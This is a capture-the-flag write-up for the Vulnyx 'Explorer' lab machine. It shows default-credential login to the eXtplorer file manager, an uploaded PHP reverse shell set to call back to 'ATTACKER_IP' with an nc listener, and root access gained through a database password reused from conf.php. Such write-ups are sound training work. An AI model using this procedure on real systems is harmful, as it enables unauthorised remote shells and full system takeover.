# Vulnyx: Explorer — Writeup

**Difficulty:** Easy
**OS:** Linux (Debian)
**Target:** `192.168.1.25`

## Summary

Explorer is an easy Linux box built around a misconfigured web application (eXtplorer) secured with default credentials. Gaining access to the file manager allows a PHP reverse shell to be uploaded directly, leading to an initial foothold as a low-privileged user. From there, a plaintext database password left in a configuration file turns out to be reused as the root password, giving full system compromise.

| Step | Technique |
|---|---|
| Recon | Nmap full port scan |
| Initial access | Default credentials (`admin:admin`) on eXtplorer |
| Foothold | Malicious file upload → PHP reverse shell |
| Privilege escalation | Credential reuse from `conf.php` → `su root` |

---

## 1. Reconnaissance

Started with a full TCP port scan:

```bash
sudo nmap -A -p- 192.168.1.25
```

Results:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.65 ((Debian))
```

Two open ports: SSH (22) and HTTP (80). The HTTP service didn't return a page title, but `http-robots.txt` leaked an interesting disallowed path:

```
| http-robots.txt: 1 disallowed entry
|_/extplorer
```

`robots.txt` pointed straight at **eXtplorer**, a web-based file manager — worth checking out first.

## 2. Initial Access — Default Credentials

Navigating to `http://192.168.1.25/extplorer` presented a login page. Tried the obvious:

```
Username: admin
Password: admin
```

It worked — the application was still on default credentials, which gave full access to the file manager and, with it, the ability to upload arbitrary files to the webroot.

## 3. Foothold — Uploading a Reverse Shell

Grabbed the classic PHP reverse shell:

```bash
git clone https://github.com/pentestmonkey/php-reverse-shell.git
```

Edited `php-reverse-shell.php` to point at my attacking machine:

```php
$ip = 'ATTACKER_IP';
$port = 4444;
```

Set up a listener:

```bash
nc -lvnp 4444
```

Uploaded the shell through the eXtplorer file manager, then triggered it by browsing to:

```
http://192.168.1.25/reverse-shell.php
```

The listener caught a connection back — foothold established. From here, `user.txt` was retrieved from the user's home directory.

## 4. Privilege Escalation — Config File Credential Reuse

With shell access, the next step was hunting for anything eXtplorer might have left lying around — config files are a classic source of leaked credentials. Checked:

```
/extplorer/config/conf.php
```

Which contained:

```php
$GLOBALS['DB_USER'] = 'root';
$GLOBALS['DB_PASSWORD'] = 'AccessGranted#1';
```

The database password was tried against the `root` system account:

```bash
su root
# Password: AccessGranted#1
```

It worked. Root access obtained, and `root.txt` retrieved from `/root`.

## Lessons Learned

- **Default credentials are still the #1 way in.** `admin:admin` on an exposed admin panel was all it took to get a foothold — no exploit needed.
- **`robots.txt` is reconnaissance gold.** It unintentionally pointed directly at the vulnerable application.
- **Credential reuse collapses privilege boundaries.** A password meant for a database account was reused for the root system account, turning a single leaked config file into full root.
- **Application config files are high-value targets** once you have any level of shell access — always check for `config.php`, `.env`, `wp-config.php`, etc.

---

*Writeup by Manjeet aka Moon — Vulnyx: Explorer*
